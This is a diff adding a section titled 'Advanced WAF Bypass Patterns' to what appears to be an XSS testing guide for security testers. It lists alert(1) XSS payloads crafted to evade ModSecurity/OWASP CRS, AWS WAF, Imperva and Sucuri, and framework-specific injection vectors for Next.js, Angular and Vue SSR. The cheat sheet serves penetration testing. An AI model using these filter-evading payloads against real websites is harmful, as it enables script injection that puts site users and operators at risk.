@@ -130,3 +130,44 @@ A reflection is NOT XSS until:
 | Admin escalation | XSS fires in admin panel context |
 | Stored cross-user | Payload persists and fires for other users |
 | Wormable | XSS that replicates itself (e.g., profile XSS that edits other profiles) |
+
+## Advanced WAF Bypass Patterns
+
+### ModSecurity / OWASP CRS
+- `<details open ontoggle=alert(1)>` (HTML5 elements often not in CRS rules)
+- `<math><mtext><table><mglyph><svg><mtext><style><path id="--><img src=x onerror=alert(1)>">`
+- `<svg/onload=alert(1)>` with null bytes: `<svg%00/onload=alert(1)>`
+- Unicode normalization: `<img src=x onerror=alert(1)>`
+
+### AWS WAF
+- Double URL encoding: `%253Cscript%253Ealert(1)%253C/script%253E`
+- JSON-based payloads in API requests (often bypass regex rules)
+- Chunked transfer encoding to split payloads across chunks
+- `<img src=x onerror="window['al'+'ert'](1)">`
+
+### Imperva/Incapsula
+- `<a href="javascript:void(0)" onmouseover=alert(1)>hover</a>`
+- Event handlers on lesser-known elements: `<marquee onstart=alert(1)>`
+- SVG animate: `<svg><animate onbegin=alert(1) attributeName=x dur=1s>`
+- Template literals: `` `${alert(1)}` ``
+
+### Sucuri
+- `<img src=x onerror=top['al\x65rt'](1)>`
+- Encoding chains: HTML entity → URL encode → Unicode
+
+### Framework-Specific Bypasses
+
+#### Next.js / React SSR
+- `dangerouslySetInnerHTML` with server-side rendered user input
+- URL-based XSS in `next/link` href prop
+- Markdown rendering without DOMPurify in MDX pages
+
+#### Angular Universal (SSR)
+- `[innerHTML]` binding with server-rendered content
+- Template injection via `{{constructor.constructor('alert(1)')()}}`
+- Bypass Angular sanitizer: `<div [innerHTML]="'<img src=x onerror=alert(1)>'">`
+
+#### Vue SSR (Nuxt)
+- `v-html` with server-side user input
+- Template compilation in SSR context
+- `<component :is="userInput">` for component injection
